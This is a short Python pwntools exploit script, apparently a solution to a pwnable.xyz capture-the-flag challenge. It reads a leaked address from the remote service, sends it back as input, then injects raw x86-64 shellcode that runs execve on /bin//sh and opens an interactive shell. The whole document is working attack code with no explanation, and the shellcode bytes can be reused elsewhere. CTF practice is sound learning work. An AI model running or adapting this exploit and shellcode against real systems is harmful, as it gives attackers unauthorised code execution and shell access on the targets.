from pwn import *


debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30025)
else:
    sh = process('./challenge')

sh.recvuntil('== ')
pan = int(sh.recvuntil('\n')[:-1], 16)
print "pan = ", pan
pause()
x1 = "0 " + str(pan)
sh.sendlineafter('> ', x1)
shellcode = "\x00\x00\x90\x90\x90\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
sh.sendafter(': ', shellcode)
sh.interactive()

